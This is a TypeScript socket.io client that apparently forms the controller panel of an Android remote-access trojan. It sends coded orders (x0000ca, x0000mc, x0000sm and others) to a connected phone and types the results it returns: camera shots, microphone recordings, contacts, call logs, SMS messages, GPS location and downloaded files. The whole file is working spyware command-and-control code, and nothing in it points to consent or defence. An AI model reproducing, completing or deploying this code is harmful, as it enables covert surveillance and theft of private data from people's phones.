import { io, Socket } from 'socket.io-client';

const SOCKET_URL = process.env.NEXT_PUBLIC_API_URL || 'http://localhost:3001';

let socket: Socket | null = null;
let connectionPromise: Promise<Socket> | null = null;

export interface CommandData {
    userId: string;
    command: {
        order: string;
        extra?: string | number;
        req?: number;
        path?: string;
        sec?: number; // For microphone recording duration
    };
}

export interface SocketResult {
    // Camera result
    image?: boolean;
    base64?: string;

    // Contacts result
    contacts?: { contactsList?: { name: string; phoneNo: string }[] };
    contactsList?: { name: string; phoneNo: string }[] | { contactsList?: { name: string; phoneNo: string }[] };

    // Calls result
    callsList?: { phoneNo: string; name: string; duration: number; type: number }[] | { callsList?: { phoneNo: string; name: string; duration: number; type: number }[] };

    // SMS result
    smsList?: { phoneNo: string; msg: string }[] | { smsList?: { phoneNo: string; msg: string }[] };

    // Location result
    enable?: boolean;
    success?: boolean;
    latitude?: number;
    longitude?: number;
    lat?: number;
    lng?: number;

    // File manager result
    data?: Array<{
        name?: string;
        filename?: string;
        file?: string;
        isDir?: boolean;
        isDirectory?: boolean;
        type?: string;
        path?: string;
        fullPath?: string;
        filepath?: string;
        size?: string;
        filesize?: string;
    }>;
    file?: boolean;
    buffer?: string;
    name?: string;
    size?: number;
    path?: string;
    error?: string;
    fileType?: string; // Audio file type (mp3, m4a, etc.)

    // Microphone result
    audio?: boolean;
}

export function initSocket(userId: string): Socket {
    // If already connected with same user, return existing socket
    if (socket?.connected) {
        return socket;
    }

    // Clean up existing socket if any
    if (socket) {
        socket.disconnect();
        socket = null;
    }

    socket = io(SOCKET_URL, {
        query: {
            id: userId,
            type: 'controller',
        },
        transports: ['websocket', 'polling'],
        reconnection: true,
        reconnectionAttempts: 5,
        reconnectionDelay: 1000,
        timeout: 20000,
    });

    socket.on('connect', () => {
        console.log('Socket connected:', socket?.id);
    });

    socket.on('disconnect', (reason) => {
        console.log('Socket disconnected:', reason);
        // Auto-reconnect on server disconnect
        if (reason === 'io server disconnect' && socket) {
            socket.connect();
        }
    });

    socket.on('connect_error', (error) => {
        console.error('Socket connection error:', error.message);
    });

    return socket;
}

export function getSocket(): Socket | null {
    return socket;
}

export function isConnected(): boolean {
    return socket?.connected ?? false;
}

export function disconnectSocket(): void {
    if (socket) {
        socket.removeAllListeners();
        socket.disconnect();
        socket = null;
    }
}

export function sendCommand(commandData: CommandData): boolean {
    if (socket?.connected) {
        socket.emit('command', commandData);
        console.log('Command sent:', commandData);
        return true;
    } else {
        console.error('Socket not connected. Attempting to reconnect...');
        // Try to reconnect
        if (socket) {
            socket.connect();
        }
        return false;
    }
}

export function onResult(callback: (data: SocketResult) => void): void {
    if (socket) {
        socket.off('result');
        socket.on('result', callback);
    }
}

// Command orders (from original app)
export const COMMANDS = {
    CAMERA: 'x0000ca',       // Camera capture - extra: 0 = back, 1 = front
    MICROPHONE: 'x0000mc',   // Microphone recording - sec: duration in seconds
    CONTACTS: 'x0000cn',     // Get contacts
    CALLS: 'x0000cl',        // Get call logs
    SMS: 'x0000sm',          // Get SMS - extra: 'ls' for list
    LOCATION: 'x0000lm',     // Get location
    FILE_MANAGER: 'x0000fm', // File manager - req: 0 = browse, 1 = download
} as const;

